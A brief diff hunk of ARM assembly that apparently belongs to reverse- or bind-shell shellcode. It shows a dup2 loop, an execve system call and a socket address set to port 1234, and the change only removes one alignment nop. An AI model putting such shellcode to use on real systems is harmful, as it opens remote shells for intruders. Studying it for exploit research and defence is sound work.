@@ -49,7 +49,6 @@ dup_loop:
     mov    r7, #11       // r7 = execve
     svc    1
     nop                  // alignment by 4 bytes
-    nop
 sin_port:    
 .word  0xd2040002
 sin_addr:
